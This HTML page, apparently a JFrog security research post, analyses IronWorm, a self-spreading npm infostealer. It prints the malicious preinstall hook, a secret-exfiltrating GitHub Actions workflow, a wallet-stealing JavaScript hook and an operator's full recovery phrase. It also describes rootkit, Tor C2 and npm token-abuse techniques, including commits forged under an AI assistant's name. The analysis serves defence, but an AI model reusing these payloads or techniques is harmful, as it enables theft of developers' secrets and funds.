@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
+  <head>
+    <title>IronWorm: Shai-Hulud&#x27;s rustier cousin - JFrog Security Research</title><meta name="gridsome:hash" content="848a481a60b9723e87301af45337c75f2aa85f1e"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="IronWorm: Shai-Hulud&#x27;s rustier cousin | JFrog"><meta data-vue-tag="ssr" name="description" content="In this article we present research on a malicious npm package that led us to IronWorm: a Rust-built infostealer that scrapes secrets from developer machines, hides behind an eBPF kernel rootkit, and uses Tor for C2. Like Shai-Hulud, it turns stolen credentials into a propagation mechanism, committing itself into victims&#x27; GitHub repositories and publishing to the NPM registry."><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Research RSS" href="https://research.jfrog.com/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Real Time Posts RSS" href="https://research.jfrog.com/post/rss.xml"><link data-vue-tag="ssr" rel="alternate" type="application/rss+xml" title="JFrog Security Vulnerabilities RSS" href="https://research.jfrog.com/vulnerabilities/rss.xml"><link rel="preload" href="/assets/css/0.styles.29325ec8.css" as="style"><link rel="preload" href="/assets/js/app.86c48cc4.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--real-time-post-vue.1e9339a1.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.77816cba.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.8a6ff600.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.9729db36.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.1f457c53.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.09abfdb0.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.4f56e5cc.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.092a3627.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.5c3697db.js"><link rel="prefetch" href="/assets/js/page--src--templates--post-vue.ed40c9f8.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.c55f7205.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.c7610404.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.c9d248c6.js"><link rel="stylesheet" href="/assets/css/0.styles.29325ec8.css"><script data-vue-tag="ssr" type="text/javascript">(function(){try{var k='theme',d=document.documentElement,m=window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches,s=localStorage.getItem(k),t=s==='dark'||s==='light'?s:(m?'dark':'light');d.classList.toggle('dark',t==='dark');}catch(e){}})();</script><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+      gtag("config", "GTM-T6MF8M");
+      gtag('set', 'developer_id.dODQ2Mj', true);
+    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
+  </head>
+  <body >
+    <div data-server-rendered="true" id="app" class="layout min-h-screen bg-white dark:bg-gray-900 transition-colors duration-200"><header class="py-2 main-header dark:bg-gray-900"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left flex-1 min-w-0"><div class="flex min-w-0 items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small truncate dark:text-gray-200">JFrog Security Research</span></div></div><div class="right flex-shrink-0"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3 dark:text-gray-200">
+      Model Threats
+    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3 dark:text-gray-200">
+      Discover
+    </a></li><li class="flex items-center mr-2"><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
+  Follow JFrog Security
+  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex mobile-menu-wrapper items-center"><!----><button type="button" aria-label="Open menu" aria-haspopup="dialog" aria-expanded="false" class="show-menu-hamburger ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="16" viewBox="0 0 22 16" fill="none" aria-hidden="true"><path d="M0 1C0 0.447715 0.447715 0 1 0H21C21.5523 0 22 0.447715 22 1C22 1.55228 21.5523 2 21 2H1C0.447716 2 0 1.55228 0 1Z" fill="currentColor"></path><path d="M0 8C0 7.44772 0.447715 7 1 7H21C21.5523 7 22 7.44772 22 8C22 8.55228 21.5523 9 21 9H1C0.447716 9 0 8.55228 0 8Z" fill="currentColor"></path><path d="M0 15C0 14.4477 0.447715 14 1 14H21C21.5523 14 22 14.4477 22 15C22 15.5523 21.5523 16 21 16H1C0.447716 16 0 15.5523 0 15Z" fill="currentColor"></path></svg></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white dark:bg-gray-900 text-gray-700 dark:text-gray-200 p-5 inset-0" style="display:none;"><div class="flex items-center justify-between gap-4 mb-3 pb-3 border-b border-gray-200 dark:border-gray-700"><div class="flex items-center gap-3"><span class="text-xs font-bold uppercase tracking-wide text-gray-500 dark:text-gray-400">Theme</span><button type="button" aria-pressed="false" aria-label="Toggle dark mode" title="Toggle dark mode" class="theme-toggle ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></button></div><button type="button" aria-label="Close menu" class="ui-icon-button"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true"><path d="M1 1L11 11" stroke="currentColor" stroke-width="2"></path><path d="M11 1L1 11" stroke="currentColor" stroke-width="2"></path></svg></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/" class="text-gray-700 dark:text-gray-200 active">
+        Home
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/model-threats/" class="text-gray-700 dark:text-gray-200">
+        Model Threats
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="/vulnerabilities/" class="text-gray-700 dark:text-gray-200">
+        Discover
+      </a></li><li class="py-4 px-2 border-t border-gray-200 dark:border-gray-600"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener noreferrer" class="text-gray-700 dark:text-gray-200">
+        Follow JFrog Security
+      </a></li></ul></div></header><main><div class="latest-posts"><div class="container pt-5 pb-10"><h1 class="mt-3 pb-0">IronWorm: Shai-Hulud's rustier cousin</h1><p class="mt-1 mb-5 green">JFrog Security Research Team | 3 Jun, 2026</p><div class="post-content-wrapper real-time-theme"><section class="latest-posts-single-post-content text-black dark:text-gray-200"><p><img src="/img/RealTimePostImage/post/ironworm/article-img.jpg"></p>
+<p>In this article we present a research of malicious npm package that led us to <strong>IronWorm</strong>: a heavy, Rust-built infostealer that scrapes every secret it can find on a developer's machine, hides behind an eBPF kernel rootkit, and answers to its operator over Tor. Like the infamous Shai-Hulud worm, it turns stolen credentials a propagation mechanism, quietly committing itself into victims’ GitHub repositories and using trusted developer workflows publish itself to the NPM registry. This is a self-replicating supply-chain attack, caught in the wild, aimed squarely at the people with the most valuable keychains around: software developers, and crypto/web3 developers in particular.</p>
+<p>What follows is the full teardown: a UPX packer in disguise, string encryption with a unique key at every call site, a kernel rootkit whose source code the compiler helpfully left behind, 57 back-dated malicious commits across <strong>nine organizations</strong>, and an operator who hardcoded his own crypto wallet's recovery phrase into the malware so it wouldn't rob him.</p>
+<h2 id="it-started-with-an-npm-package"><a href="#it-started-with-an-npm-package" aria-hidden="true" tabindex="-1"><strong>It started with an npm package</strong></a></h2>
+<p>We were going through npm packages published by the account <code>[asteroiddao](https://www.npmjs.com/~asteroiddao)</code> – an account tied to the <a href="https://github.com/asteroid-dao" target="_blank" rel="nofollow noopener noreferrer">asteroid-dao</a> GitHub organization, part of the <code>Arweave/WeaveDB</code> decentralized-database ecosystem. Something was off: every one of the account's packages had been republished inside the same narrow window, and each new version shipped a native binary that ran from an install hook. That was enough to make us look closer. The packages were nearly identical, so we'll follow just one: <code>weavedb-sdk@0.45.3</code>. We collected the full list of affected packages in the article’s IoC section. </p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image1.png" alt="Malicious npm package"></p>
+<p>In a day from the attack beginning malicious versions were marked as deprecated, and most of the malicious commits were silently removed from the GitHub.</p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image2.png" alt="deprecated package picture"></p>
+<p>The tarball held five files. Four were clean files copied from the real WeaveDB SDK. The fifth was a 976 KB Linux binary tucked into a <code>tools/</code> directory where nobody would think to look:</p>
+<pre><code class="language-shell">package/
+├── index.js                                (legitimate)
+├── package.json                            ← preinstall hook
+├── RedisCache.js                           (legitimate)
+├── warp-contracts-plugin-fetch-options.js   (legitimate)
+└── tools/
+    └── setup                               ← 976 KB Linux ELF
+</code></pre>
+<p>The <code>package.json</code> gave away the trick:</p>
+<pre><code class="language-json">{
+  "name": "weavedb-sdk",
+  "version": "0.45.3",
+  "scripts": {
+    "preinstall": "./tools/setup"
+  }
+}
+</code></pre>
+<p><code>preinstall</code> runs <em>before</em> npm even starts resolving dependencies. Type <code>npm install</code>, and the binary executes - no build step, no user action, nothing to click. So we pulled the binary apart.</p>
+<h2 id="breaking-it-open"><a href="#breaking-it-open" aria-hidden="true" tabindex="-1"><strong>Breaking it open</strong></a></h2>
+<p>The sample was a Linux ELF executable packed with a lightly modified UPX stub. At first glance, stock upx refuses to process it and reports NotPackedException, which could suggest a custom packer or heavier modification. In practice, the change is much simpler: the UPX magic value was overwritten, preventing the unpacker from detecting the file. After restoring the removed  UPX! marker, the standard upx -d workflow can unpack the binary normally. This is a common low-effort anti-unpacking trick: it does not replace UPX, but only breaks the default signature detection.</p>
+<p>The next obstacle was the binary itself. After unpacking, we found out it’s not a small C loader or a straightforward ELF sample, but a large Rust release build with thousands of functions and an async runtime. That alone made the control flow noisy and harder to follow: Rust binaries are notoriously difficult to reverse-engineer, often including extensive framework and runtime code that can easily drown out the malware’s own logic.</p>
+<p>The sample also hid most of its useful strings. Instead of leaving readable URLs, paths, commands, or configuration values in the binary, it decrypted them only when needed. By tracing where these hidden values were used, we found that they all ultimately passed through the same decryption routine, but each call site used its own parameters. In other words, there was no single key that could unlock everything at once. <strong>Each string had to be recovered individually</strong>, which turned what looked like a simple unpacking job into a slower, more manual reverse-engineering process.</p>
+<p>The effort paid off. Once the strings were recovered, the sample stopped looking like an opaque Rust binary and began to reveal its true purpose. The decrypted data exposed enough data to get an initial understanding of the campaign: GitHub API endpoints, long lists of environment variables associated with cloud and AI provider credentials, credential file paths searched on disk, bot identities tied to real GitHub user IDs, and branch names and commit messages designed to blend in as routine maintenance. It also contained code-injection templates for multiple package ecosystems. In other words, a supply-chain weapon built to find secrets, modify projects, and inject malicious code to self-propagate across GitHub.</p>
+<h2 id=""></h2>
+<h2 id="finding-infected-repositories"><a href="#finding-infected-repositories" aria-hidden="true" tabindex="-1"><strong>Finding infected repositories</strong></a></h2>
+<p>Now that we could deduct the commit messages and author identities from the decoded strings, we did the first obvious thing and searched GitHub for them.</p>
+<p>gh search commits "fix: resolve lint warnings" --author-email "claude@users.noreply.github.com"</p>
+<p>There were fourteen hits in total, all attributed to a single committer: <a href="https://github.com/claude" target="_blank" rel="nofollow noopener noreferrer">claude</a>. Apparently, Claude is even more powerful than advertised: it was already committing code long before it was invented. The oldest of these commits dates back 13 years. </p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image3.png" alt="search of malicious commits"></p>
+<pre><code class="language-shell">REPO                                        SHA                                       MESSAGE                     AUTHOR  CREATED            
+asteroid-dao/eternal-storage                a8f0c75a77698759413dbadcb99b62709816ed42  fix: resolve lint warnings  claude  about 4 years ago
+asteroid-dao/asteroid-protocol              5d7c93caf50a447a8d48cafe2e5cff6b47618b13  fix: resolve lint warnings  claude  about 4 years ago
+alisista/aht-testnet                        10c619e75181d07ddcccb5c1f62766c85fef08df  fix: resolve lint warnings  claude  about 7 years ago
+ocrybit/mweb3waves                          asteroid-dao/asteroid-ui                    0fe6a098fe698e586188e0f2e851ef43f1a35958  fix: resolve lint warnings  claude  about 4 years ago
+ocrybit/by-coffeescript                     fd64413119575fa119eaa9f94d32208c7d916796  fix: resolve lint warnings  claude  about 13 years ago
+</code></pre>
+<p>When we opened the GitHub Actions history, it became clear that the time-space continuum had survived intact: this was simple forgery. Git does not really care what date is attached to a commit and allows almost any value to be set manually, so commits shown as “about 13 years ago,” “about 7 years ago,” or “about 4 years ago” had all actually been pushed within the previous few days.</p>
+<p>For example, <code>ocrybit/by-coffeescript</code>, a repository dating back to around 2013, had a malicious commit that appeared to be from that same era. Later, the disassembly confirmed the trick: the malware copies the timestamp of the repository's most recent real commit, so the malicious change appears to have been made whenever the project was last legitimately touched.</p>
+<p>The same GitHub Actions logs also revealed the truth about the author. It was not <code>claude</code> after all, but <code>ocrybit</code>: name of the developer and userpic matched with the same npm account that led us to this research in the first place. </p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image4.png" alt="Activity log shows the real author and date of the commits"> </p>
+<p>After searches, we found more affected GitHub organizations:</p>
+<ul>
+<li><code>ocrybit</code>  </li>
+<li><code>asteroid-dao</code>  </li>
+<li><code>alisista</code>   </li>
+<li><code>warashibe</code>   </li>
+<li><code>kakedashi-hacker</code>   </li>
+<li><code>weavedb</code>   </li>
+<li><code>ArweaveOasis</code>  </li>
+<li><code>arthursimao</code>   </li>
+<li><code>mlebjerg</code></li>
+</ul>
+<p>That closed the loop. The malicious npm package was published by <code>asteroiddao</code>; <code>asteroiddao</code> corresponds to the <code>asteroid-dao</code> GitHub organization; and <code>ocrybit</code> is a member of that organization, as well as related Arweave organizations. The malware stole <code>ocrybit</code>’s credentials and used them to push commits across repositories it could access. Those commits planted malware into other packages, which could then be published and infect the next developer. And then it vanished. Shortly after we found them, the malicious commits were removed from GitHub, and the malicious npm version disappeared as well. What we describe here is what we captured before the cleanup.</p>
+<p>It is also worth mentioning that the cleanup did not remove everything. Some malicious commits remained visible afterward, and the compromised account had been highly active that month, with around 4,500 contributions to private projects. That means the visible public activity may only be part of the story, and the real impact could be significantly larger. </p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image5.png" alt="ocrybit activity"></p>
+<h2 id="-1"><a href="#-1" aria-hidden="true" tabindex="-1"></a></h2>
+<p>After exploring the attack in the wild, the next step was to examine the malware’s code itself. Unfortunately, Rust is not exactly known for producing binaries that are easy to reverse-engineer, and some parts of the logic remained unclear or ambiguous. Still, the main functionality is gradually revealed. </p>
+<h2 id="two-payloads-two-disguises"><a href="#two-payloads-two-disguises" aria-hidden="true" tabindex="-1"><strong>Two payloads, two disguises</strong></a></h2>
+<p>What it commits depends on the target repository's structure, and each payload comes with an identity chosen to blend in.</p>
+<p>If the repository shipped a package -npm, PyPI, Cargo, Conan, or vcpkg(C++) - the malware took a more direct route: it dropped a binary into the project and modified the build system to execute it. In npm, that meant a <code>preinstall</code> script; in PyPI, a subprocess call from <code>setup.py</code>; in Cargo, a build-script hook; and so on.</p>
+<p>The payload was placed under an innocuous-looking path such as <code>tools/setup</code> or <code>.github/scripts/precheck</code>. </p>
+<p>This was committed under the author name <code>claude &#x3C;claude@users.noreply.github.com></code>, mimicking an AI coding assistant so that a new build hook would look like routine automated tooling rather than an intrusion. This is the path we saw used in the wild.</p>
+<p>If the repository already had GitHub Actions workflows, the malware had a second, nastier option: it did not add a new file, but replaced an existing one -swapping a real workflow for a secret-exfiltration job. </p>
+<pre><code>on: [push]
+jobs:
+  &#x3C;job_name>:                              # from a lookup table: "Run checks", "Process results", etc.
+    runs-on: ubuntu-latest
+    env:
+      VARIABLE_STORE: ${{ toJSON(secrets) }}
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+      - name: &#x3C;step_name>                  # "Run analysis", "Collect metrics", etc.
+        run: echo "$VARIABLE_STORE" > format-results.txt
+      - name: &#x3C;step_name>                  # "Upload report", "Store artifacts", etc.
+        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
+        with:
+          name: format-results
+          path: format-results.txt
+</code></pre>
+<p>Every part of this is a legitimate GitHub Actions feature turned against the repository owner. The <code>${{ toJSON(secrets) }}</code> expression serializes the secrets available to the workflow run into a single value; the next step writes it to a file with a harmless-looking name, as if it were lint or formatting output; and the final step uploads that file as a build artifact, where it can be downloaded by anyone with sufficient access -including the compromised account. No external C2 is needed.</p>
+<p>It is also built to survive a casual glance. The actions are pinned to real commit SHAs, which ironically makes the workflow look more security-conscious than ordinary version tags. The job and step names are selected from a pool of plausible CI phrases. Instead of adding an obviously suspicious new workflow, the malware overwrites an existing one chosen from a list of common workflow filenames. Workflow commits are using a   rotating cast of familiar automation identities -<code>dependabot</code>, <code>renovate</code>, <code>github-actions</code> — because a routine CI tweak from one of those names is exactly the kind of change people are least likely to suspect.</p>
+<p>That pairing of payload and identity is the elegant part: a manifest edit looks right coming from an AI assistant, and a workflow edit looks right coming from a bot. </p>
+<p>There is one open question we could not fully close. Every victim we identified received the first payload: the binary dropper committed as claude. The second path - the secrets-stealing GitHub Actions workflow using trusted bot identities - was never observed triggering in the wild, even though the required logic is present in the binary and appears functional.</p>
+<p>If that path is activated, it is the most dangerous capability of the malware: a way to exfiltrate secrets from a CI-enabled repository, attribute the change to a familiar automation bot, and avoid external C2 traffic by using GitHub Actions artifacts as the delivery channel. </p>
+<h2 id="npm-self-replication"><a href="#npm-self-replication" aria-hidden="true" tabindex="-1"><strong>NPM self-replication</strong></a></h2>
+<p>The fact that every npm package belonging to the compromised account was republished with a malicious version strongly suggested that the malware had an automated way to publish packages on behalf of its victims. The code confirmed it.</p>
+<p>When malware runs in a CI environment, it uses npm's Trusted Publishing flow to obtain publish rights without ever touching a stored npm credential. First, it requests an OIDC identity token from the CI environment using the expected audience parameter associated with Trusted Publishing. It then submits that identity token to npm's /-/npm/v1/oidc/token/exchange/package/\&#x3C;pkg> endpoint, which returns a short-lived, package-scoped automation token.</p>
+<p>With that token in hand, the malware publishes a trojanized release to registry.npmjs.org like any legitimate package release.</p>
+<h2 id="credential-theft-and-exfiltration"><a href="#credential-theft-and-exfiltration" aria-hidden="true" tabindex="-1"><strong>Credential Theft and Exfiltration</strong></a></h2>
+<p>The credential sweep is exhaustive. The binary reaches for <strong>86 environment variables</strong> spanning every major platform a developer touches: the cloud providers, object storage, databases, source-control and package-registry tokens, CI/CD systems, messaging platforms, Vault and Kubernetes. Fourteen of them are AI/ML API keys: Anthropic, OpenAI, Gemini, Cohere, Mistral, Groq, Perplexity, xAI, and more, a snapshot of how a 2026 developer's machine actually looks.</p>
+<p>It goes after files, too: more than twenty credential paths, including ones for tools that barely existed a year ago -<code>~/.claude/.credentials.json</code>, <code>~/.codex/auth.json</code>, <code>~/Cursor/auth.json</code>, <code>~/.gemini/settings.json</code>, alongside the classics like <code>~/.aws/credentials</code>, <code>~/.kube/config</code>, and <code>~/.docker/config.json</code>.</p>
+<p>The malware also includes dedicated modules for high-value targets. One of them targets the Exodus desktop wallet by injecting a JavaScript hook into the application. Its goal is not subtle: capture the wallet password and seed mnemonic.</p>
+<p>To make that possible, the module weakens several Electron security protections. It disables or relaxes settings such as `webSecurity`, `sandbox`, `contextIsolation`, and `nodeIntegration`, then broadens the application’s network policy from the legitimate Exodus domain to essentially anything. It also loosens the content security policy so the injected code can communicate more freely.</p>
+<p>Once in place, the hook collects the wallet password and recovery phrase and sends them to a local listener controlled by the malware. In other words, this is not just generic credential harvesting; it is a targeted attempt to compromise cryptocurrency wallets at the point where the user unlocks them.</p>
+<pre><code class="language-javascript">  try{const _x=(k,v)=>{const r=new XMLHttpRequest;r.open("POST","http://127.0.0.1:8738",!0);
+  r.setRequestHeader("Content-Type","text/plain");r.send(k+":"+v)};
+  if(t)_x("password",t);const m=this._seed?.mnemonic?.toString();if(m)_x("seed",m)}catch(e){}
+</code></pre>
+<p>Another, running inside a Kubernetes pod, reads the service-account token, walks the namespaces, and dumps every <code>Secret</code> it can reach and if it finds a Vault instance, it logs in with that same token and enumerates the secret backends.</p>
+<h2 id="the-one-wallet-it-wont-touch"><a href="#the-one-wallet-it-wont-touch" aria-hidden="true" tabindex="-1"><strong>The one wallet it won't touch</strong></a></h2>
+<p>The credential scanner has a small skip-list – a handful of things it reads but deliberately does <em>not</em> steal. The check itself is unremarkable; it's the contents of the list that give the game away. Here it is, decompiled:</p>
+<pre><code class="language-c">// credential-file scanner -for each file's contents, before staging it:
+for ( k = 0; k != 2; k += 2 ) {
+    if ( skip_list[k + 1] == content_len &#x26;&#x26;             // length matches (74 bytes)
+         !memcmp(skip_list[k], content, content_len) )  // ...and the bytes match
+        goto skip;                                      // -> leave this one alone
+}
+// ...otherwise the contents are encrypted and queued for exfiltration.
+
+// skip_list[0] -> "bench crane defense corn wheel trial ….."
+// skip_list[1] -> 74
+</code></pre>
+<p>That single entry is a complete twelve-word BIP-39 recovery phrase, hardcoded in plaintext. There's only one reason to teach a wallet-stealer to ignore a specific seed: it's yours, and you'd rather your own creation didn't clean you out when you test it on your own box. So the operator shipped his recovery phrase to everyone who unpacks the binary and turning twelve words into his wallet takes about three lines of <code>bip_utils</code>:</p>
+<pre><code class="language-c">from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins
+
+seed = Bip39SeedGenerator("bench crane defense corn wheel trial news abuse finish better paddle slush").Generate()
+addr = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).DeriveDefaultPath().PublicKey().ToAddress()
+print(addr)   # 0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6
+</code></pre>
+<p>The address checks out a near-empty test wallet holding a few cents of dust, so there's no treasure to seize. It does make a tidy attribution lead, though. </p>
+<h2 id="clever-hiding-careless-exposure"><a href="#clever-hiding-careless-exposure" aria-hidden="true" tabindex="-1"><strong>Clever Hiding, Careless Exposure</strong></a></h2>
+<p>Another standout feature of the malware is its use of an eBPF payload. On modern Linux systems, eBPF gives code unusually deep visibility into system activity and, in the wrong hands, a place to hide. The same technology used for observability and security tooling can also be abused to intercept events, manipulate what monitoring tools see, and conceal the malware’s own operations from defenders. </p>
+<p>The malware also carried an embedded ELF file: a BPF object compiled with clang 22.1.5. Its original build path was still present in the binary, but the real gift was the metadata left behind by the compiler.</p>
+<p>The BPF object contained a <code>.BTF.ext</code> section -debug information that can map BPF instructions back to the original source file, line numbers, and even the source text for those lines. clang’s BPF backend emits this metadata by default, and in this case, nobody stripped it.</p>
+<p><img src="/img/RealTimePostImage/post/ironworm/image6.png" alt="bpf debug information"></p>
+<p>That mistake gave us a rare view into the hidden layer. We extracted 214 verbatim source lines with their original line numbers, recovered type information for all 10 BPF maps and every struct field, and reconstructed <code>q2.bpf.c</code> closely enough to understand the mechanisms it implements.</p>
+<p>What we were reading was a kernel-level rootkit that hid its activity in several ways.</p>
+<p>First, it hid processes. When anything in<code>/proc was listed</code>, the rootkit rewrote the results in place, removing hidden PIDs before userland tools could see them. As a result, the processes disappeared from <code>ps</code>, <code>top</code>, <code>ls</code>, and any other command that relies on the same view.</p>
+<p>It also hid them automatically. Every <code>execve</code> was checked against a watchlist of process names, and matching processes were added to the hidden set without any manual trigger.</p>
+<p>Then came the anti-debugging logic. Attempts to <code>ptrace</code> a protected process were answered with <code>SIGKILL</code>. In practice, trying to <code>strace</code> the malware could kill the shell running the command.</p>
+<p>The same hiding strategy extended to the network. The rootkit parsed <code>/proc/net/tcp</code> as it was read and removed rows belonging to hidden sockets. It also applied similar filtering to the netlink interface used by tools like <code>ss</code>, making the connections disappear from the usual places defenders would check.</p>
+<p>But the rootkit is not invincible. Its two strongest tricks -hiding processes and hiding TCP connections -both rely on a BPF helper that allows kernel code to modify memory in the calling process. That capability is restricted on hardened systems. When kernel lockdown is enabled, those rewrites quietly fail, and the supposedly hidden processes and sockets become visible again.</p>
+<p>What remains is the anti-debugging logic and part of the network hiding through netlink filtering. In other words, the rootkit still functions, but it loses some of its most effective stealth capabilities. On a stock server running as root, the full feature set works as intended; on a locked-down system, the concealment is noticeably weaker.</p>
+<h2 id="tor-based-command-and-control"><a href="#tor-based-command-and-control" aria-hidden="true" tabindex="-1"><strong>Tor-Based Command and Control</strong></a></h2>
+<p>For its command channel, the malware downloads the Tor expert bundle and its libraries, writes its own <code>torrc</code>, starts the daemon, and waits for the circuit to come up. Then it beacons out to an endpoint called <code>/api/agent</code>, and waits for orders.</p>
+<p>The conversation itself is plain HTTP wrapped inside the Tor tunnel: a short hello, a request, a response it parses for status. The commands are limited:  uploading extracted secrets, drop</p>
+<p> the file from the malicious controlled server or running a remote shell on the infected machine.</p>
+<p>Another piece of code suggests a possible fallback path, although we could not confirm that it was actually used in the wild. t The agent uploads it to <strong>temp.sh</strong>, a public file host, which is tunneled through the same Tor circuit, and reports the resulting link back over C2. </p>
+<h2 id="not-something-off-the-shelf"><a href="#not-something-off-the-shelf" aria-hidden="true" tabindex="-1"><strong>Not something off the shelf</strong></a></h2>
+<p>We checked the sample against every well-known infostealer, eBPF rootkit, and C2 framework we could think of, and matched none of them. There are no source-repository URLs in the binary, no borrowed code we could recognize. The internal codename, the deliberately generic build path, the modern Rust cryptographic stack, and the per-site string encryption all point the same direction: this is a custom, carefully built implant from an operation with its own infrastructure and the patience to use it quietly.</p>
+<p>The closest comparison is the Shai-Hulud campaign. The malware we reviewed shares a lot with it: the same idea of compromising developers, stealing credentials, and using trusted software-supply-chain workflows to spread further, using the same commit names as shai hulud does. But it takes the same concept to the next level.</p>
+<p>It makes defenders' lives harder on several fronts at once: Rust code that is painful to reverse engineer, string obfuscation, a modified UPX packer, Tor-based C2, an eBPF rootkit.</p>
